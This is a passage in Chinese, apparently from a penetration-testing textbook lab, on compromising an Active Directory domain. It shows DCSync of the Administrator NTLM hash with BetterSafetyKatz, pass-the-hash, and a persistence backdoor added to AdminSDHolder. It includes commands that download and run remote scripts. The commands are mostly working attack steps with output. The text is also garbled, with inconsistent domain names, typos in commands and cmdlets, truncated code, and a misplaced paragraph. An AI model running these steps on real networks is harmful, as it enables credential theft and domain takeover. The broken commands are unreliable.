
```
PS C:\programdata> Get-DomainUser PasswordAdmin | select memberof
memberof

CN=CloudSync Users,OU=Administrative Groups,DC=ghh,DC=local
```

CloudSync 用户组位于一个管理单元（OU）中，所以这看起来可能很有前景。让我们看看是否能在 AD 中找到任何我们的 `passwordadmin` 用户或 `CloudSync Users` 具有权限的有趣 ACL。第一步是使用 PowerShell 的 `Find-InterestingDomainAcl` cmdlet，它将搜索 AD 对象上的权限。我们希望将其保存到变量中，这样我们就不需要反复运行它，因为这非常耗时，而且域越大，结果就越多。我们还指定了 `ResolveGUIDs` 选项，以便在搜索完成后能够轻松读取权限：

```
PS C:\programdata> $acls = Find-InterestingDomainAcl -ResolveGUIDs
```

**提示** 这可能需要大量时间。此工具正在扫描域中的所有 ACL，并为每个条目的解析信息。

接下来，我们想要寻找将我们的用户和组作为 `IdentityReferenceName`（身份引用名称）一部分的项。我们可以使用 PowerShell 为我们进行过滤：

```hell
PS C:\programdata> $acls | % {
>> if($_.IdentityReferenceName -eq "PasswordAdmins" -or
>> $_.IdentityReferenceName -eq "CloudSync Users") {
$nObjectDN : DC=gh,DC=local
AceQualifier : AccessAllowed
ActiveDirectoryRights : ExtendedRight
ObjectType : DS-Replication-Get-Changes-All
AceFlags : None
AceType : AccessAllowedObject
InheritanceFlags : None
SecurityIdentifier : S-1-5-21-326289812-2511208411-1049563518-4207
IdentityReferenceName : CloudSync Users
IdentityReferenceDomain : gh.local
IdentityReferenceDN : CN=CloudSync Users,OU=Administrative Groups,DC=gh,DC=local
IdentityReferenceClass : group
```

看起来 CloudSync 用户组具有与域进行 DCSync 的能力。我们可以以用户身份登录并执行这些任务，或者可以使用 Rubeus 来添加。

将更改应用到中心，在一个小时内，更改将应用到所有管理员（admin）对象上。反之，如果你更改了管理员对象，SDProp 进程将在一小时内替换掉你的更改。

在实验 17-12 中，我们执行了 DCsync 并在我们的会话中注入了 Kerberos 票据（ticket）。对于这种攻击，我们需要在会话中拥有 NTLM 哈希值。为了实现这一点，我们将再次加载 BetterSafetyKatz，对管理员（Administrator）账户进行 DCsync 操作，然后使用 NTLM 哈希值为我们在目标机器上的会话启动一个新的 `cmd.exe`：

```
PS C:\Windows\System32>iex (ir http://10.0.0.40:8080/Invoke-BetterSafetyKatz.ps1)
PS C:\Windows\Invoke-BetterSafetyKatz
[+] stolen from @harmjoy, @TheRealMover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrt9
<sniped>
DA2PWR6 # privilege:debug
dcssync /user:Administrator
<sniped>
Credentials:
Hash NTLM: 19d56dfa872c603984c44ff96a896c
<sniped>
DA2PWR6 # sekurlsa:/pth /user:Administrator /domain:ghh.local
Privilege '20' OK
/ntlm/19d56dfa872c603984c44ff96a896c
user : Administrator
domain : ggh.local
program : cmd.exe
impers : no
NTLM : 19d56dfa872c603984c44ff96a896c
PID 2792
TID 4848
LSA Process is now R/W
LUID 0 ; 249605489 (00000000:0ee0ad71)
msv1_0 - data copy 0000002ADF56181F0 : OK !
kerberos - KO
```

此时应该弹出一个带有命令提示符的新窗口。现在我们需要加载 PowerView，以便能够轻松地查看当前 AdminSDHolder 对象的权限，然后添加我们的后门：

```
C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.
PS C:\Windows\system32> iex (irw http://10.0.0.40:9999/PanelView.ps1)
PS C:\> Get-ObjectACL -SearchBase "CN=AdminSDHolder,CN=System,DC=ghh,DC=local" \
>> -ResolveGUIDs \
>> Where ActiveRights -like "GenericAll" \
>> %{ ConvertFrom-SID $_.SecurityIdentifier }
Local System
```

现在，只有 Local System BUILTIN 账户对 AdminSDHolder 对象具有完全权限。让我们添加目标用户，这样我们就能重新进入。为了实现这一点，我们将使用 PowerShell 中的 `Add-ObjectACL` 命令。我们将针对 AdminSDHolder 对象并使用以下选项添加 `GenericAll` 权限：

```
PS C:\> sb = 'CN=AdminSDHolder,CN=System,DC=ghh,DC=local'
PS C:\> Get-ObjectACL -TargetSearchBase $sb -PrincipalIdentity target -Rights All
```

现在，当我们检查权限时，我们应该在访问列表中看到 GHH\target 用户具有 `GenericAll` 权限：

```
PS C:\> Get-ObjectACL -SearchBase $sb -ResolveGUIDs \
>> Where ActiveRights -like "GenericAll" \
>> %{ ConvertFrom-SID $_.SecurityIdentifier }
GHH\target
Local System
```

成功了！权限每小时会传播到其他组，因此我们需要等一会儿，然后我们就可以检查检查域管理员（Domain Admin）组，并发现目标对该组有访问权限：

```
PS C:\> Get-ObjectACL -Identity "Domain Admins" -ResolveGUIDs \
>> Where ActiveRights -like "GenericAll" \
>> %{ ConvertFrom-SID $_.SecurityIdentifier }
Local System
PS C:\> Get-ObjectACL -Identity "Domain Admins" -ResolveGUIDs \
>> Where ActiveRights -like "GenericAll" \
>> %{ ConvertFrom-SID $_.SecurityIdentifier }
GHH\target
Local System
```

我们看到第一次尝试时，Local System 拥有完全访问权限，但等几分钟后，我们看到目标用户也被列了出来。作为我们的目标用户，我们现在可以随所欲地向组添加成员。

![](img/0add480ffb73b6bc89b65d99f7d6b37a_627_0.png)

**注意** 这可能需要一小时的时间。如果你想让它运行得更快，可以在 DC 上的会话中运行存储中 `Run-SDProp.ps1` 文件的内容。
